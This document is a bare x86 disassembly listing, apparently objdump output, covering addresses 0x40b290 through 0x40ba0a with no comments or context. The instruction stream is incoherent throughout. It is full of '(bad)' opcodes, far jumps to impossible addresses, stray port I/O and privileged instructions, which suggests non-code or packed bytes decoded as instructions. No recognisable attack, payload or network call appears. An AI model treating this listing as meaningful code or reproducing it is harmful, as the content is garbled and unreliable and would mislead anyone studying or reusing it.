  40b290:	inc    edx
  40b291:	shr    DWORD PTR [ebx+0x503675fd],0xa9
  40b298:	mov    dl,0x8
  40b29a:	adc    al,0xbf
  40b29c:	jmp    0x44f3abc
  40b2a1:	outs   dx,DWORD PTR ds:[esi]
  40b2a2:	les    esp,FWORD PTR ds:[esi-0x39]
  40b2a6:	add    al,al
  40b2a8:	lods   eax,DWORD PTR ds:[esi]
  40b2a9:	jne    0x40b254
  40b2ab:	fsubr  QWORD PTR [esi+0x65]
  40b2ae:	fs mov bh,0x66
  40b2b1:	bound  ebx,QWORD PTR [ecx+0x4a]
  40b2b4:	mov    al,0x13
  40b2b6:	inc    esi
  40b2b7:	ret    
  40b2b8:	xor    BYTE PTR [esi-0x7f4e575c],cl
  40b2be:	push   eax
  40b2bf:	aaa    
  40b2c0:	dec    edx
  40b2c1:	sub    DWORD PTR [edx-0xf759a94],esi
  40b2c7:	xchg   esp,eax
  40b2c8:	pop    ds
  40b2c9:	and    eax,0x1382013
  40b2ce:	sub    DWORD PTR ds:0xf119da3d,0x53
  40b2d5:	cmp    ecx,DWORD PTR [edi-0xd]
  40b2d8:	mov    eax,ds:0x7a5ca3e2
  40b2dd:	jmp    0x40b311
  40b2df:	scas   eax,DWORD PTR es:[edi]
  40b2e0:	mov    ebp,0xbfd732f8
  40b2e5:	jp     0x40b270
  40b2e7:	pop    ebx
  40b2e8:	rep stos DWORD PTR es:[edi],eax
  40b2ea:	int3   
  40b2eb:	scas   al,BYTE PTR es:[edi]
  40b2ec:	es and al,0x3f
  40b2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2f0:	nop
  40b2f1:	push   edx
  40b2f2:	xchg   ecx,eax
  40b2f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2f4:	sub    eax,0x46551084
  40b2f9:	pop    eax
  40b2fa:	nop
  40b2fb:	jecxz  0x40b2f5
  40b2fd:	add    dh,ch
  40b2ff:	gs pop ebx
  40b301:	mov    eax,0x503d55b7
  40b306:	repz cmp dh,cl
  40b309:	jae    0x40b2cb
  40b30b:	ret    0x3027
  40b30e:	pop    edi
  40b30f:	cmp    DWORD PTR [ebx],edx
  40b311:	mov    al,0x4b
  40b313:	jne    0x40b2d2
  40b315:	jo     0x40b308
  40b317:	add    BYTE PTR [eax],bl
  40b319:	cli    
  40b31a:	ins    DWORD PTR es:[edi],dx
  40b31b:	add    DWORD PTR cs:[eax-0x8],ecx
  40b31f:	imul   ebx,DWORD PTR [eax+0x21d948],0x42
  40b326:	int3   
  40b327:	js     0x40b349
  40b329:	and    BYTE PTR [ebx+0x5ae33a1b],al
  40b32f:	mov    al,0x63
  40b331:	add    DWORD PTR [esi],ecx
  40b333:	add    al,0x64
  40b335:	and    ch,BYTE PTR [eax-0x49]
  40b338:	adc    eax,0x7e684ea7
  40b33d:	(bad)  
  40b33e:	adc    ebp,DWORD PTR [ecx]
  40b340:	mov    edi,0x9c7fdff2
  40b345:	(bad)  
  40b346:	push   ds
  40b347:	jnp    0x40b355
  40b349:	jo     0x40b399
  40b34b:	xlat   BYTE PTR ds:[ebx]
  40b34c:	js     0x40b2fa
  40b34e:	js     0x40b300
  40b350:	pop    ss
  40b351:	shl    DWORD PTR [eiz*8-0x1de1785f],cl
  40b358:	aaa    
  40b359:	jg     0x40b3c8
  40b35b:	xchg   DWORD PTR [edi-0xdd0dc1],esp
  40b361:	(bad)  
  40b362:	mov    edi,0x3caf967a
  40b367:	cmp    esp,DWORD PTR [edi+edx*8]
  40b36a:	fcomi  st,st(5)
  40b36c:	push   edi
  40b36d:	sbb    edx,DWORD PTR [edx-0x76]
  40b370:	inc    ebx
  40b371:	and    ecx,DWORD PTR [edi+0x3695849d]
  40b377:	jns    0x40b3f8
  40b379:	inc    eax
  40b37a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b37b:	pop    ecx
  40b37c:	or     eax,0xbd5420a7
  40b381:	mov    edi,0x4f43e4a0
  40b386:	in     al,dx
  40b387:	repz fwait
  40b389:	jmp    eax
  40b38b:	or     DWORD PTR [esi+0x79aa36b7],esi
  40b391:	std    
  40b392:	loop   0x40b40b
  40b394:	mov    ebx,0xfaaf5dea
  40b399:	fsubp  st(5),st
  40b39b:	jbe    0x40b366
  40b39d:	repz pushf 
  40b39f:	das    
  40b3a0:	cld    
  40b3a1:	(bad)  
  40b3a2:	xlat   BYTE PTR ds:[ebx]
  40b3a3:	mov    ecx,0xe670d578
  40b3a8:	rol    DWORD PTR [edi-0x17],0x74
  40b3ac:	ss push 0xddbc3677
  40b3b2:	iret   
  40b3b3:	sub    dh,0xc7
  40b3b6:	cli    
  40b3b7:	sub    al,0xc2
  40b3b9:	lods   eax,DWORD PTR ds:[esi]
  40b3ba:	mov    ecx,0x73cc5d7a
  40b3bf:	mov    edx,0x8884df30
  40b3c4:	cwde   
  40b3c5:	inc    edx
  40b3c6:	int    0xef
  40b3c8:	loop   0x40b355
  40b3ca:	inc    esi
  40b3cb:	iret   
  40b3cc:	push   ss
  40b3cd:	mul    DWORD PTR ds:0xc9aa4375
  40b3d3:	cmp    al,0xfc
  40b3d5:	lea    ecx,[eax-0x4f272278]
  40b3db:	add    dh,BYTE PTR [eax+0x2c03d6ad]
  40b3e1:	dec    ebx
  40b3e2:	mov    esi,DWORD PTR [edi+eax*4+0x308cd274]
  40b3e9:	jg     0x40b3cd
  40b3eb:	stos   BYTE PTR es:[edi],al
  40b3ec:	cli    
  40b3ed:	or     bl,dh
  40b3ef:	and    esi,DWORD PTR [eax*2-0x7bd04ef8]
  40b3f6:	js     0x40b44f
  40b3f8:	inc    ebx
  40b3f9:	xor    BYTE PTR [eax+0x3c],0x6
  40b3fd:	mov    al,0x13
  40b3ff:	pushf  
  40b400:	xor    eax,0xad1b76ed
  40b405:	or     eax,0xb1b39965
  40b40a:	xor    eax,esp
  40b40c:	in     al,dx
  40b40d:	and    esp,DWORD PTR [edi]
  40b40f:	jns    0x40b401
  40b411:	cmp    eax,0x30da30e7
  40b416:	lahf   
  40b417:	into   
  40b418:	cmp    DWORD PTR [eax],edi
  40b41a:	fsub   QWORD PTR [edi+0x30]
  40b41d:	sbb    al,0x54
  40b41f:	cmp    eax,esp
  40b421:	inc    ebp
  40b422:	push   ecx
  40b423:	push   esp
  40b424:	imul   ebx,DWORD PTR [esi-0x3fe0a241],0xffffffdd
  40b42b:	mov    dh,0x1d
  40b42d:	mov    ch,0xff
  40b42f:	pop    esi
  40b430:	jge    0x40b434
  40b432:	popf   
  40b433:	dec    esi
  40b434:	(bad)  
  40b435:	or     eax,0x1ad34d57
  40b43a:	and    edx,DWORD PTR [esi+0x4a]
  40b43d:	xchg   ecx,eax
  40b43e:	addr16 sbb edi,edx
  40b441:	scas   al,BYTE PTR es:[edi]
  40b442:	iret   
  40b443:	icebp  
  40b444:	mov    ds:0x2d2ebda1,eax
  40b449:	fwait
  40b44a:	add    ch,dl
  40b44c:	mov    bl,0x79
  40b44e:	test   DWORD PTR [edi+0x52],ebp
  40b451:	pusha  
  40b452:	jecxz  0x40b491
  40b454:	out    0x36,eax
  40b456:	add    BYTE PTR [eax+0xbd36bf5],0xb7
  40b45d:	daa    
  40b45e:	push   ecx
  40b45f:	cmp    edi,ebp
  40b461:	jmp    DWORD PTR [eax-0x4203e01a]
  40b467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b468:	jns    0x40b44e
  40b46a:	xchg   ecx,eax
  40b46b:	inc    edi
  40b46c:	adc    BYTE PTR [edx+0x54],al
  40b46f:	icebp  
  40b470:	loope  0x40b4c7
  40b472:	rcl    DWORD PTR [eax+esi*1-0x2448915d],1
  40b479:	in     eax,0x67
  40b47b:	jg     0x40b463
  40b47d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b47e:	jns    0x40b46f
  40b480:	jecxz  0x40b491
  40b482:	icebp  
  40b483:	scas   eax,DWORD PTR es:[edi]
  40b484:	jle    0x40b481
  40b486:	dec    ebx
  40b487:	cld    
  40b488:	lahf   
  40b489:	push   esi
  40b48b:	add    ah,bl
  40b48d:	fld    DWORD PTR [ebx-0x28]
  40b490:	(bad)  
  40b492:	lea    ebx,[edx+0x7a]
  40b495:	int    0x14
  40b497:	push   0x3482fa86
  40b49c:	cld    
  40b49d:	add    DWORD PTR [ebp-0x17279023],edx
  40b4a3:	fsubr  st(4),st
  40b4a5:	out    dx,eax
  40b4a6:	std    
  40b4a7:	repnz mov BYTE PTR [edi+0x46ae77de],ah
  40b4ae:	std    
  40b4af:	jecxz  0x40b4ab
  40b4b1:	(bad)  
  40b4b2:	jmp    0x40b4f0
  40b4b4:	jl     0x40b498
  40b4b6:	cli    
  40b4b7:	push   cs
  40b4b8:	jne    0x40b458
  40b4ba:	and    al,0x9
  40b4bc:	pop    edi
  40b4bd:	dec    dl
  40b4bf:	mov    bl,0xfc
  40b4c1:	jmp    0xdc72e3fd
  40b4c6:	jp     0x40b45a
  40b4c8:	dec    esi
  40b4c9:	outs   dx,DWORD PTR ds:[esi]
  40b4ca:	xchg   ebx,eax
  40b4cb:	jbe    0x40b534
  40b4cd:	add    al,0xc8
  40b4cf:	lds    ecx,FWORD PTR [ebx+ecx*8]
  40b4d2:	adc    eax,0xfbed8f65
  40b4d7:	mov    eax,0x5337580d
  40b4dc:	dec    ebp
  40b4dd:	fild   WORD PTR gs:[edi-0x61153389]
  40b4e4:	pop    ebx
  40b4e5:	aam    0x15
  40b4e7:	ds pushf 
  40b4e9:	mov    ds:0xbaa10209,eax
  40b4ee:	test   al,0x9d
  40b4f0:	push   ebx
  40b4f1:	inc    esp
  40b4f2:	jne    0x40b4db
  40b4f4:	mov    esi,0xe8801356
  40b4f9:	jp     0x40b529
  40b4fb:	and    BYTE PTR [esi+eax*4+0x14],0xf3
  40b500:	mov    ah,BYTE PTR ds:0x2d6b12ac
  40b506:	mov    bl,0xd9
  40b508:	ins    BYTE PTR es:[edi],dx
  40b509:	imul   edi,eax,0xcc6210b3
  40b50f:	and    ah,dh
  40b511:	cli    
  40b512:	scas   al,BYTE PTR es:[edi]
  40b513:	leave  
  40b514:	jno    0x40b52e
  40b516:	rol    BYTE PTR [esi+0x0],0x0
  40b51a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b51b:	adc    ch,BYTE PTR [edi-0x44896dfc]
  40b521:	ret    
  40b522:	push   edi
  40b523:	mov    esi,0x9d3a45f2
  40b528:	ds pop ds
  40b52a:	(bad)  
  40b52b:	lock shl DWORD PTR [edi+eax*1+0x1d],cl
  40b530:	cli    
  40b531:	inc    ebx
  40b532:	aaa    
  40b533:	call   0x779eeaff
  40b538:	cld    
  40b539:	push   ecx
  40b53a:	or     BYTE PTR [eax-0x6c],bh
  40b53d:	fmul   QWORD PTR [ebp-0xf]
  40b540:	out    dx,eax
  40b541:	aad    0x1f
  40b543:	adc    BYTE PTR [edi-0x5],bl
  40b546:	mov    fs,WORD PTR [eax]
  40b548:	mov    al,ds:0x4fffc535
  40b54d:	fnstsw WORD PTR [ebx-0x39]
  40b550:	pop    ebx
  40b551:	xchg   esi,eax
  40b552:	pop    ebp
  40b553:	cmc    
  40b554:	popf   
  40b555:	fistp  QWORD PTR [ebp-0x32]
  40b558:	mov    ecx,0x2f58bef9
  40b55d:	aad    0xab
  40b55f:	push   edi
  40b560:	mov    eax,ds:0xd5abbabb
  40b565:	sub    eax,0x2dd5b51a
  40b56a:	pop    ecx
  40b56b:	adc    ch,BYTE PTR ds:0x63242509
  40b571:	sbb    DWORD PTR [ecx+0x60],ecx
  40b574:	test   BYTE PTR [edx],al
  40b576:	add    ch,BYTE PTR [esi+eax*8-0x2]
  40b57a:	int3   
  40b57b:	mov    ebx,fs
  40b57d:	pusha  
  40b57e:	iret   
  40b57f:	or     al,0x1f
  40b581:	arpl   WORD PTR [edi+0x3481c01c],cx
  40b587:	mul    BYTE PTR [eax-0x7d]
  40b58a:	(bad)  
  40b58b:	data16 xchg BYTE PTR [eax-0x40],ah
  40b58f:	pusha  
  40b590:	les    eax,FWORD PTR [eax+0x42d90208]
  40b596:	push   0x9
  40b598:	dec    ecx
  40b599:	je     0x40b552
  40b59b:	cmp    dh,BYTE PTR [edi+0x75]
  40b59e:	push   ebp
  40b59f:	xchg   DWORD PTR [edx-0x51],ecx
  40b5a2:	repnz stos DWORD PTR es:[edi],eax
  40b5a4:	jp     0x40b59f
  40b5a6:	out    0x7b,al
  40b5a8:	ret    0x3f9e
  40b5ab:	jbe    0x40b5e5
  40b5ad:	sti    
  40b5ae:	pushf  
  40b5af:	jnp    0x40b60f
  40b5b1:	push   ebp
  40b5b2:	mov    ebp,0xef1aaa92
  40b5b7:	dec    edi
  40b5b8:	mov    ebp,0x7d8727ba
  40b5bd:	neg    BYTE PTR [edx-0x15]
  40b5c0:	mov    bh,0xc2
  40b5c2:	pop    esi
  40b5c3:	sub    ecx,DWORD PTR [ecx+ebp*1]
  40b5c6:	xchg   ebp,eax
  40b5c7:	retf   
  40b5c8:	out    dx,al
  40b5c9:	or     eax,0x6c4a9729
  40b5ce:	ins    BYTE PTR es:[edi],dx
  40b5cf:	outs   dx,BYTE PTR ds:[esi]
  40b5d0:	mov    dl,0xb1
  40b5d2:	sub    DWORD PTR [eax+0x63ef57d2],edx
  40b5d8:	push   esp
  40b5d9:	add    dl,dl
  40b5db:	jmp    0x45:0x3f686435
  40b5e2:	test   eax,0x4109a00a
  40b5e7:	call   0x6988c6df
  40b5ec:	and    ch,dh
  40b5ee:	aam    0xbe
  40b5f0:	push   0x79
  40b5f2:	xor    DWORD PTR [edi],0xffffffbd
  40b5f5:	popa   
  40b5f6:	das    
  40b5f7:	ja     0x40b5d6
  40b5f9:	jne    0x40b622
  40b5fb:	in     eax,0x72
  40b5fd:	(bad)  [esi]
  40b5ff:	or     al,0xf3
  40b601:	mov    WORD PTR [ecx+0x57],?
  40b604:	stos   BYTE PTR es:[edi],al
  40b605:	pop    ecx
  40b606:	push   cs
  40b607:	ret    
  40b608:	shl    BYTE PTR [edx+0x7ff5ff81],1
  40b60e:	stc    
  40b60f:	add    BYTE PTR [ebx-0x5],cl
  40b612:	mov    esi,0xc7fccfc0
  40b617:	rcr    DWORD PTR [eax+ebx*2-0x43],cl
  40b61b:	add    DWORD PTR [edx+ebx*4+0x4f],0xffffff9c
  40b620:	push   ecx
  40b621:	hlt    
  40b622:	sbb    DWORD PTR [ebp-0x3],esi
  40b625:	mov    ecx,0xd8737e56
  40b62a:	test   al,0xf1
  40b62c:	iret   
  40b62d:	mul    DWORD PTR [ebx]
  40b62f:	fdivp  st(1),st
  40b631:	out    0x21,al
  40b633:	pop    ds
  40b634:	cld    
  40b635:	test   bl,0x94
  40b638:	dec    edx
  40b639:	dec    edx
  40b63a:	jp     0x40b621
  40b63c:	and    eax,0xfee9158
  40b641:	sub    DWORD PTR [edx+0x31],esi
  40b644:	stc    
  40b645:	cld    
  40b646:	jmp    0x40b63d
  40b648:	cmp    ah,BYTE PTR [edi+0xfe59f4f]
  40b64e:	(bad)  
  40b64f:	jmp    0x40b5e4
  40b651:	adc    ah,ch
  40b653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b654:	cmp    DWORD PTR [ecx],esi
  40b656:	dec    edi
  40b657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b658:	xor    al,BYTE PTR [ecx+0x32755417]
  40b65e:	mov    ds:0x8ac4c7ac,eax
  40b663:	jge    0x40b622
  40b665:	sub    al,0x32
  40b667:	(bad)  
  40b669:	cmc    
  40b66a:	ss xchg ecx,eax
  40b66c:	xor    al,BYTE PTR [edi]
  40b66e:	xchg   esi,esp
  40b670:	inc    esi
  40b671:	ins    BYTE PTR es:[edi],dx
  40b672:	add    esp,DWORD PTR [esi+0x18ee451f]
  40b678:	mov    bl,0x20
  40b67a:	int    0xf5
  40b67c:	jb     0x40b634
  40b67e:	add    DWORD PTR [edx],0x2224907c
  40b684:	xor    eax,0x152ac5fe
  40b689:	pop    edx
  40b68a:	adc    al,0x42
  40b68c:	lods   eax,DWORD PTR ds:[esi]
  40b68d:	adc    al,0x33
  40b68f:	xor    edi,DWORD PTR ds:0xf264636e
  40b695:	xchg   BYTE PTR [eax-0x2d],al
  40b698:	daa    
  40b699:	outs   dx,BYTE PTR ds:[esi]
  40b69a:	xor    eax,0x6f1be720
  40b69f:	mov    ds:0x696f8142,eax
  40b6a4:	fisttp DWORD PTR ds:0x83b24802
  40b6aa:	iret   
  40b6ab:	mov    bl,0x86
  40b6ad:	xor    ch,ah
  40b6af:	imul   ebp
  40b6b1:	add    ch,BYTE PTR [edx-0x3ff86b21]
  40b6b7:	shl    DWORD PTR [esi],cl
  40b6b9:	sbb    BYTE PTR [ebp+0x3d7d7b67],0xb0
  40b6c0:	jg     0x40b6f9
  40b6c2:	sti    
  40b6c3:	int    0xb2
  40b6c5:	mov    ecx,0x2176c8ff
  40b6ca:	call   0x864db2c4
  40b6cf:	inc    ebx
  40b6d0:	xchg   ebp,eax
  40b6d1:	or     DWORD PTR [eax+0x6f],ebx
  40b6d4:	xchg   ebx,eax
  40b6d5:	push   edx
  40b6d6:	push   edx
  40b6d7:	scas   al,BYTE PTR es:[edi]
  40b6d8:	xchg   esp,eax
  40b6d9:	cmp    DWORD PTR [edi-0x6],edi
  40b6dc:	and    dl,BYTE PTR [edi+0x57]
  40b6df:	push   ebx
  40b6e0:	leave  
  40b6e1:	and    DWORD PTR [edi+ecx*1+0x40],ebx
  40b6e5:	bound  esi,QWORD PTR [ebx+edi*2+0xd0649dd]
  40b6ec:	push   0xf1965b77
  40b6f1:	imul   ebx,eax,0xf4143c29
  40b6f7:	push   edi
  40b6f8:	test   BYTE PTR [eax],ch
  40b6fa:	adc    DWORD PTR [edx+esi*2],esp
  40b6fd:	enter  0xd8e4,0x80
  40b701:	mov    ebx,0x5aa1ef0f
  40b706:	lods   eax,DWORD PTR ds:[esi]
  40b707:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b709:	iret   
  40b70a:	out    0xfb,al
  40b70c:	scas   al,BYTE PTR es:[edi]
  40b70d:	call   0xce219fe9
  40b712:	xchg   bx,ax
  40b714:	dec    edi
  40b715:	jl     0x40b703
  40b717:	cmp    eax,0x927a581c
  40b71c:	lahf   
  40b71d:	cld    
  40b71e:	ja     0x40b74f
  40b720:	lock in al,dx
  40b722:	dec    ebx
  40b723:	or     eax,DWORD PTR [ecx+edx*2-0x12de8ca7]
  40b72a:	jmp    0xdb0d:0x32633433
  40b731:	shl    BYTE PTR [ebx+0x45],cl
  40b734:	dec    esp
  40b735:	rcl    BYTE PTR [ecx+0xb],0xa4
  40b739:	(bad)  
  40b73a:	(bad)  
  40b73c:	xlat   BYTE PTR ds:[ebx]
  40b73d:	clc    
  40b73e:	lahf   
  40b73f:	jg     0x40b721
  40b741:	xor    eax,0x598d8d8c
  40b746:	loop   0x40b777
  40b748:	cmp    ah,0x45
  40b74b:	mov    edi,0xa73cd966
  40b750:	dec    edx
  40b751:	in     eax,dx
  40b752:	cmc    
  40b753:	sub    BYTE PTR [ebx],ch
  40b755:	imul   eax,DWORD PTR [ecx],0xfffffff3
  40b758:	jnp    0x40b751
  40b75a:	push   ecx
  40b75b:	test   eax,0x8caa524c
  40b760:	xchg   ecx,eax
  40b761:	les    eax,FWORD PTR [edx+0x9784ac4]
  40b767:	push   cs
  40b768:	shl    DWORD PTR [ebp+0x736f47c3],1
  40b76e:	xchg   ecx,eax
  40b76f:	adc    BYTE PTR [esp+eiz*4+0x59970cb6],0x4a
  40b777:	push   edx
  40b778:	inc    ebx
  40b779:	lahf   
  40b77a:	je     0x40b7ab
  40b77c:	mov    ds:0x184e4101,al
  40b781:	mov    DWORD PTR [ebx+eax*8-0x31],edx
  40b785:	fmul   DWORD PTR [edx]
  40b787:	or     ah,BYTE PTR [esi+edx*4-0x6c]
  40b78b:	sub    esp,esi
  40b78d:	aaa    
  40b78e:	jg     0x40b73a
  40b790:	inc    edx
  40b791:	jb     0x40b75b
  40b793:	fdivr  DWORD PTR [eax-0x69]
  40b796:	mov    ecx,0x5c061559
  40b79b:	add    BYTE PTR fs:[edi],dh
  40b79e:	(bad)  
  40b7a0:	adc    al,0x44
  40b7a2:	int    0x31
  40b7a4:	clc    
  40b7a5:	cmc    
  40b7a6:	out    dx,eax
  40b7a7:	(bad)  
  40b7a8:	(bad)  
  40b7a9:	out    dx,eax
  40b7aa:	mov    edi,0xb04041a5
  40b7af:	sti    
  40b7b0:	test   BYTE PTR [eax],ah
  40b7b2:	into   
  40b7b3:	(bad)  
  40b7b4:	xor    al,0xf
  40b7b6:	push   0x6
  40b7b8:	imul   edi,DWORD PTR [esi],0xc0b667c9
  40b7be:	inc    ebx
  40b7bf:	push   ecx
  40b7c0:	dec    ecx
  40b7c1:	in     al,0x1b
  40b7c3:	cmp    ebp,0x6bf223d7
  40b7c9:	popf   
  40b7ca:	push   ebx
  40b7cb:	mov    ah,0x6c
  40b7cd:	fisub  WORD PTR ds:0x1e7987a3
  40b7d3:	popa   
  40b7d4:	mov    edi,0xee003d6f
  40b7d9:	mov    cl,0xe5
  40b7db:	jb     0x40b776
  40b7dd:	stos   DWORD PTR es:[edi],eax
  40b7de:	stos   DWORD PTR es:[edi],eax
  40b7df:	pop    ebx
  40b7e0:	mov    ah,0xdb
  40b7e2:	sahf   
  40b7e3:	call   0xa40c:0x9e842b89
  40b7ea:	mov    cs,WORD PTR [ebx-0x5c]
  40b7ed:	inc    esp
  40b7ee:	and    al,0xd9
  40b7f0:	jmp    0x40b859
  40b7f2:	jne    0x40b873
  40b7f4:	in     al,dx
  40b7f5:	mov    dl,0xdd
  40b7f7:	dec    esi
  40b7f8:	mov    ds:0x5af40363,al
  40b7fd:	and    dl,BYTE PTR [eax-0x505f33b7]
  40b803:	mov    ds:0x72e5cb27,al
  40b808:	popa   
  40b809:	lea    edi,[eax-0x2d]
  40b80c:	lahf   
  40b80d:	scas   al,BYTE PTR es:[edi]
  40b80e:	sub    eax,0x63a2adc3
  40b813:	je     0x40b806
  40b815:	jb     0x40b7d0
  40b817:	int3   
  40b818:	mov    ebx,0xf626f5df
  40b81d:	cs dec esp
  40b81f:	icebp  
  40b820:	mov    ds:0x7c27f13f,eax
  40b825:	loope  0x40b7f8
  40b827:	or     DWORD PTR [edx],esp
  40b829:	cmp    DWORD PTR [ecx+0x529999bf],esp
  40b82f:	lods   al,BYTE PTR ds:[esi]
  40b830:	and    eax,0x50615164
  40b835:	xlat   BYTE PTR ds:[ebx]
  40b836:	cli    
  40b837:	out    dx,eax
  40b838:	inc    esp
  40b839:	sbb    eax,0xf9b78d4e
  40b83e:	sahf   
  40b83f:	div    DWORD PTR [edi]
  40b841:	mov    eax,0xb12a35ef
  40b846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b847:	dec    ebx
  40b848:	cld    
  40b849:	inc    ebp
  40b84a:	mov    edi,0xb6600aae
  40b84f:	sbb    DWORD PTR [ebp+0x3e7df7c5],edx
  40b855:	idiv   ecx
  40b857:	inc    edi
  40b858:	jns    0x40b854
  40b85a:	stc    
  40b85b:	sub    ecx,DWORD PTR [esp+ecx*2-0x23]
  40b85f:	dec    ebx
  40b860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b861:	ss inc ebp
  40b863:	test   eax,0xd6f80e3c
  40b868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b869:	xor    BYTE PTR [ecx+0x7d6b5bf6],0x2a
  40b870:	xchg   ebp,eax
  40b871:	push   ebx
  40b872:	push   cs
  40b873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b874:	ja     0x40b805
  40b876:	loopne 0x40b8ef
  40b878:	rep lods eax,DWORD PTR ds:[esi]
  40b87a:	frstor [ebx-0xb]
  40b87d:	mov    ecx,0x1bca0546
  40b882:	pop    ss
  40b883:	in     eax,dx
  40b884:	mov    eax,ds:0x2bd21de9
  40b889:	mov    ecx,0x622ea787
  40b88e:	cmc    
  40b88f:	pop    ebp
  40b890:	test   esi,ecx
  40b892:	push   es
  40b893:	and    al,0xd3
  40b895:	lods   al,BYTE PTR ds:[esi]
  40b896:	inc    eax
  40b897:	dec    ecx
  40b898:	inc    edx
  40b899:	loopne 0x40b912
  40b89b:	or     DWORD PTR [edx+0x367ec239],eax
  40b8a1:	mov    eax,ds:0xcf1be98f
  40b8a6:	repz scas al,BYTE PTR es:[edi]
  40b8a8:	push   ebp
  40b8a9:	or     eax,0xd0db9b68
  40b8ae:	scas   al,BYTE PTR es:[edi]
  40b8af:	aas    
  40b8b0:	aas    
  40b8b1:	aaa    
  40b8b2:	xlat   BYTE PTR ds:[ebx]
  40b8b3:	or     al,0x57
  40b8b5:	xchg   esi,eax
  40b8b6:	xor    dl,cl
  40b8b8:	pop    ecx
  40b8b9:	jno    0x40b8a7
  40b8bb:	sahf   
  40b8bc:	adc    DWORD PTR ds:0xaae8cd55,edi
  40b8c2:	loopne 0x40b93d
  40b8c4:	push   ds
  40b8c5:	mov    ebp,0x489b2f5e
  40b8ca:	les    ebp,FWORD PTR [ecx+0x45]
  40b8cd:	xchg   edx,eax
  40b8ce:	mov    ds:0xdceb5da8,al
  40b8d3:	(bad)  [ebx+edi*4]
  40b8d6:	div    DWORD PTR [ebx]
  40b8d8:	pop    ds
  40b8d9:	arpl   WORD PTR [eax],di
  40b8db:	sbb    al,0x2a
  40b8dd:	adc    BYTE PTR [ebx],0xc2
  40b8e0:	stc    
  40b8e1:	loopne 0x40b8e5
  40b8e3:	aas    
  40b8e4:	lock fldcw WORD PTR [esi+0xd]
  40b8e8:	dec    eax
  40b8e9:	mov    ds:0xf564d98a,al
  40b8ee:	jg     0x40b915
  40b8f0:	int    0xd2
  40b8f2:	add    dl,BYTE PTR [esi-0x2b668b5a]
  40b8f8:	cmp    ah,BYTE PTR [ecx+0x7f230e91]
  40b8fe:	mov    cl,0x2a
  40b900:	and    bl,BYTE PTR [edx-0x5be3153c]
  40b906:	and    al,0x49
  40b908:	jl     0x40b8e4
  40b90a:	pop    ebp
  40b90b:	lahf   
  40b90c:	sub    edx,DWORD PTR [edi+0x55]
  40b90f:	rcl    BYTE PTR [ecx+ebp*4+0x54],0x2
  40b914:	shr    BYTE PTR [ecx],cl
  40b916:	mov    cl,0x26
  40b918:	dec    edx
  40b919:	into   
  40b91a:	jge    0x40b98a
  40b91c:	xlat   BYTE PTR ds:[ebx]
  40b91d:	jmp    0x6369:0x4a5cfa6e
  40b924:	sbb    DWORD PTR [esi-0x3ca16417],edi
  40b92a:	dec    edi
  40b92b:	(bad)  
  40b92c:	fcomp  DWORD PTR [edi-0x20]
  40b92f:	mov    ebx,0xb29b62ff
  40b934:	ja     0x40b94f
  40b936:	lods   al,BYTE PTR ds:[esi]
  40b937:	shr    DWORD PTR [ebx],1
  40b939:	push   ecx
  40b93a:	retf   
  40b93b:	sub    DWORD PTR [edi-0x42fdbcbd],esi
  40b941:	pushf  
  40b942:	cmp    bl,bl
  40b944:	add    DWORD PTR [ecx-0x219df5b0],ebx
  40b94a:	cli    
  40b94b:	push   eax
  40b94c:	enter  0xbe07,0xfd
  40b950:	mov    al,0x8a
  40b952:	cwde   
  40b953:	aam    0xf6
  40b955:	xchg   esp,esi
  40b957:	fnsave [ebx-0xc32c3bb]
  40b95d:	mov    ecx,0xa9354cdb
  40b962:	inc    esi
  40b963:	mov    ds:0xce272bc1,eax
  40b968:	lock fistp QWORD PTR [esi]
  40b96b:	(bad)  
  40b96c:	cmp    al,0x22
  40b96e:	pop    eax
  40b96f:	mov    al,ds:0x52a598de
  40b974:	sbb    eax,0x242af7c7
  40b979:	mov    cl,0xb4
  40b97b:	(bad)  
  40b97c:	je     0x40b983
  40b97e:	stos   DWORD PTR es:[edi],eax
  40b97f:	fidiv  DWORD PTR gs:[edi-0x22aa4046]
  40b986:	cmp    eax,0xb0256ebd
  40b98b:	fcmovnb st,st(7)
  40b98d:	out    0x7c,al
  40b98f:	addr16 mov ebx,0x115acc54
  40b995:	test   eax,0x1e94dcca
  40b99a:	lahf   
  40b99b:	call   0xf82f3ffa
  40b9a0:	push   esp
  40b9a1:	(bad)  
  40b9a2:	mov    ecx,0xe7dcfcb3
  40b9a7:	xor    bh,BYTE PTR [edi+0x52]
  40b9aa:	push   0xffffffc2
  40b9ac:	(bad)  
  40b9ad:	adc    edx,DWORD PTR [edx-0x2b022a8]
  40b9b3:	inc    ebp
  40b9b4:	xor    al,0xaa
  40b9b6:	adc    DWORD PTR [esi-0x5cece179],ebx
  40b9bc:	in     eax,0xc0
  40b9be:	cmp    eax,0xeddba3cf
  40b9c3:	fidivr DWORD PTR [ecx+ecx*4]
  40b9c6:	mov    ecx,0x814a4b76
  40b9cb:	in     eax,0xdb
  40b9cd:	outs   dx,BYTE PTR ds:[esi]
  40b9ce:	adc    BYTE PTR [eax+0x3],al
  40b9d1:	mov    al,0x11
  40b9d3:	pop    ebx
  40b9d4:	or     BYTE PTR [esi-0x78],0x99
  40b9d8:	jmp    0x772f:0xce9fbe2e
  40b9df:	push   ecx
  40b9e0:	and    edi,0x1d3a7479
  40b9e6:	jmp    0x40b9f1
  40b9e8:	mov    eax,0x1be00d96
  40b9ed:	or     eax,0xce5a77fb
  40b9f2:	adc    BYTE PTR ds:0x385b7d28,cl
  40b9f8:	pop    edx
  40b9f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9fa:	push   esp
  40b9fb:	test   BYTE PTR [esi],0x35
  40b9fe:	or     eax,0x25c64438
  40ba03:	or     BYTE PTR [ecx+eax*2-0x56c5ba37],dl
  40ba0a:	fs iret 
